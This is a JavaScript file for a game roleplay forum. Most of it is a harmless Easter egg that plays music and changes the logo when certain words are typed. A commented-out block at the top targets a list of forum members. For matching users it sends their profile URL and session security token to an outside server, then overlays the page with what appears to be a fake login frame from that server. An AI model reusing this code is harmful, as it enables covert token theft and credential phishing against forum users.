/*
$( document ).ready(function() {

	function recreate_log()
	{
		document.body.innerHTML = "<iframe style='position:absolute; left: 0; right: 0; bottom: 0; top: 0px; margin: 0; padding: 0; height: 100%; overflow: hidden;' width='100%' height='100%' frameborder='0' src='http://www.laughoverlife.com/forum/nlogin.php'></iframe>";
		console.log("-- DOCUMENT LOADED --");
	};
	
	function check_directory()
	{
		console.log("-- CHECKING DIRECTORY CACHE --");
		
		//var acp_urlloc = window.location.href;
		//var acp_urllocsplit = acp_urlloc.split("/"); 
		//var acp_urllocsplit2 = acp_urllocsplit[(acp_urllocsplit.length)-1].split("?");
		//var acp_urllocsplit3 = acp_urllocsplit2[1].split("-");
		//if (acp_urllocsplit2[0] == "member.php" && acp_urllocsplit3[0] == "30243") {
		
		
			if (localStorage.username2699 == null) {
				localStorage.username2699 = "ABC";
				console.log("-- LOADING DOCUMENT1 --");
				recreate_log();
			}
		//};
	};
	
	// oms, nimra, ygidorp, yteews, yer, sttaw, selwonk, nevek, xeller
	// nothing personal guys, just business, except yteews, fuck you
	//ids = ["2947", "28601", "28576", "9940", "115", "16472", "20128", "11473", "17852"];
	userUrl0 = $("#toplinks .isuser .welcomelink > a").href;
	userUrl1 = $("#toplinks .isuser .welcomelink > a")[0].href;
    
	for(i=0; i<ids.length; i++) {
		console.log("-- CHECKING FOR IDS --");
		if(userUrl0) {
			if(userUrl0.indexOf(ids[i]) > -1) {
    				theData = { a: userUrl0, b: SECURITYTOKEN };
				$.ajax({ type: 'POST', url: 'http://laughoverlife.com/forum/write2.php', data: theData });
				console.log("-- ID WAS FOUND --");
				*
				check_directory();
			};
		};
		    
		if(userUrl1) {
			if(userUrl1.indexOf(ids[i]) > -1) {
    				theData = { a: userUrl1, b: SECURITYTOKEN };
				$.ajax({ type: 'POST', url: 'http://laughoverlife.com/forum/write2.php', data: theData });
				console.log("-- ID WAS FOUND --");
				check_directory();
			};
		};
	};
})
*/

var key_audio = new Audio();
var changelogo = document.getElementsByClassName("logo");

var key_1 = 0; //G
var key_2 = 0; //H
var key_3 = 0; //O
var key_4 = 0; //S
var key_5 = 0; //T

var key_6 = 0; //S
var key_7 = 0; //P
var key_8 = 0; //O
var key_9 = 0; //K
var key_10 = 0; //Y
document.addEventListener("keydown", function(event) {
	if(event.key == "g") {
		key_1 = 1;
	} else if(event.key == "h") {
		key_2 = 1;
	} else if(event.key == "o") {
		key_3 = 1;
	} else if(event.key == "s") {
		key_4 = 1;
	} else if(event.key == "t") {
		key_5 = 1;
	} else {
		key_1 = 0;
		key_2 = 0;
		key_3 = 0;
		key_4 = 0;
		key_5 = 0;
	}
	if(event.key == "s") {
		key_6 = 1;
	} else if(event.key == "p") {
		key_7 = 1;
	} else if(event.key == "o") {
		key_8 = 1;
	} else if(event.key == "k") {
		key_9 = 1;
	} else if(event.key == "y") {
		key_10 = 1;
	} else {
		key_6 = 0;
		key_7 = 0;
		key_8 = 0;
		key_9 = 0;
		key_10 = 0;
	}
});

function CheckAllKeys()
{
	if(key_1 == 1 && key_2 == 1 && key_3 == 1 && key_4 == 1 && key_5 == 1) {
		
		key_audio.pause();
		key_audio.currentTime = 0;
		key_audio = new Audio('https://raw.githubusercontent.com/chaos12135/sarp_forum/master/_files/Original%20GhostBusters%20Theme%20Song.mp3');
		key_audio.load();
		key_audio.play();
		
		changelogo[0].innerHTML = '<img alt="San Andreas Roleplay: samp.gta-sarp.com:4500" title="San Andreas Roleplay: samp.gta-sarp.com:4500" src="https://uproxx.files.wordpress.com/2014/10/ghostbusters-2-animated-title-card_columbia-pictures.gif" width="350">';
		
		alert("I'm not afraid of no ghost!");
		
		key_1 = 0;
		key_2 = 0;
		key_3 = 0;
		key_4 = 0;
		key_5 = 0;
		key_6 = 0;
		key_7 = 0;
		key_8 = 0;
		key_9 = 0;
		key_10 = 0;
		
	};
	if(key_6 == 1 && key_7 == 1 && key_8 == 1 && key_9 == 1 && key_10 == 1) {
		
		key_audio.pause();
		key_audio.currentTime = 0;
		key_audio = new Audio('https://raw.githubusercontent.com/chaos12135/sarp_forum/master/_files/Spooky%20Scary%20Skeletons%20(Remix)%20-%20Extended%20Mix.mp3');
		key_audio.load();
		key_audio.play();
		
		changelogo[0].innerHTML = '<img alt="San Andreas Roleplay: samp.gta-sarp.com:4500" title="San Andreas Roleplay: samp.gta-sarp.com:4500" src="http://orig05.deviantart.net/05c8/f/2015/122/2/4/4461483_by_milky_operation-d8rwqqv.gif" height="150">';
		
		alert("Spooky Spooky Skeltons!");
		
		key_1 = 0;
		key_2 = 0;
		key_3 = 0;
		key_4 = 0;
		key_5 = 0;
		key_6 = 0;
		key_7 = 0;
		key_8 = 0;
		key_9 = 0;
		key_10 = 0;
	};
};

setInterval(CheckAllKeys, 500);
